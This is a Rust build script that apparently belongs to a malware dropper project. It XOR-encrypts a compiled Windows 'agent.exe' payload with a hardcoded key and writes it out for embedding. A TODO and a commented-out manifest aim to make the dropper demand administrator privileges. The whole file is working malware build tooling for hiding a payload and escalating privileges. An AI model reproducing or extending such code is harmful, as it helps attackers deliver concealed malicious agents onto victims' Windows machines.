use std::{env, fs::OpenOptions, io::Write as _, path::Path};

fn encrypt_data(data: &[u8], key: &[u8]) -> Vec<u8> {
    let mut encrypted_data = Vec::with_capacity(data.len());

    for (i, &byte) in data.iter().enumerate() {
        let key_byte = key[i % key.len()];
        encrypted_data.push(byte ^ key_byte);
    }

    encrypted_data
}

fn prepare_binary() -> () {
    let key = "ABCDEFGHIKLMNOPQRSTVXYZ".as_bytes();

    #[cfg(debug_assertions)]
    let agent_bytes = include_bytes!("../target/x86_64-pc-windows-gnu/debug/agent.exe");
    #[cfg(not(debug_assertions))]
    let agent_bytes = include_bytes!("../target/x86_64-pc-windows-gnu/release/agent.exe");
    let encrypted = encrypt_data(agent_bytes, key);

    let mut file_out = OpenOptions::new()
        .read(true)
        .write(true)
        .create(true)
        .open(Path::new(&env::var_os("OUT_DIR").unwrap()).join("enc"))
        .expect("Could not open output file");
    file_out.write(&encrypted).expect("Write error");
}

// TODO Make dropper ask for admin privileges
fn main() {
    prepare_binary();

    /*
        // only build the resource for release builds
        // as calling rc.exe might be slow
        // if std::env::var("PROFILE").unwrap() == "release" {
        let mut res = winres::WindowsResource::new();
        // res.set_icon("resources\\ico\\fiscalidade_server.ico") // TODO Set icon
        res.set_manifest(
            r#"
    <assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
    <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
        <security>
            <requestedPrivileges>
                <requestedExecutionLevel level="requireAdministrator" uiAccess="false" />
            </requestedPrivileges>
        </security>
    </trustInfo>
    </assembly>
    "#,
        );
        match res.compile() {
            Err(error) => {
                write!(std::io::stderr(), "{}", error).unwrap();
                std::process::exit(1);
            }
            Ok(_) => {}
        }
        // }
        */
}
